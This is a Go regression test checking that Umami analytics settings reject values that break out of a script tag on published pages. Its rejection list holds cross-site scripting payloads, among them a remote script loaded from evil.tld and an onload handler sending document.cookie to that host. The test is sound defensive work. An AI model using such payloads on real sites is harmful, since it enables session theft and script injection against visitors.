package settingspolicy

import "testing"

// analytics is an agent-writable category, and both values land unescaped in a
// <script> tag in the <head> of every published page. umami_site_id had no
// validator at all, and umami_url only had to satisfy url.Parse, which happily
// accepts quotes and angle brackets inside a path. The sink now escapes too;
// this is the other half, so a future sink that forgets is not an injection on
// every page of every site.
func TestAnalyticsUmamiRejectsAttributeBreakingValues(t *testing.T) {
	bad := map[string][]string{
		"umami_url": {
			`https://evil.tld/a"></script><script>alert(document.domain)</script><script src="https://evil.tld/x.js`,
			`https://evil.tld/a"onload="alert(1)`,
			"https://evil.tld/a\nx",
			"https://evil.tld/a\tx",
			"https://evil.tld/<svg onload=alert(1)>",
		},
		"umami_site_id": {
			`x" onload="fetch('https://evil.tld/'+document.cookie)`,
			`a"><script>alert(1)</script>`,
			"a b",
			"a/../b",
		},
	}
	for key, values := range bad {
		for _, v := range values {
			if err := ValidateSetting("analytics", key, v); err == nil {
				t.Errorf("analytics.%s accepted an attribute-breaking value: %q", key, v)
			}
		}
	}

	// Legitimate values must still work, or operators cannot configure Umami.
	for key, v := range map[string]string{
		"umami_url":     "https://analytics.example.com",
		"umami_site_id": "4f2a1b3c-1111-2222-3333-444455556666",
	} {
		if err := ValidateSetting("analytics", key, v); err != nil {
			t.Errorf("analytics.%s rejected a legitimate value %q: %v", key, v, err)
		}
	}
}
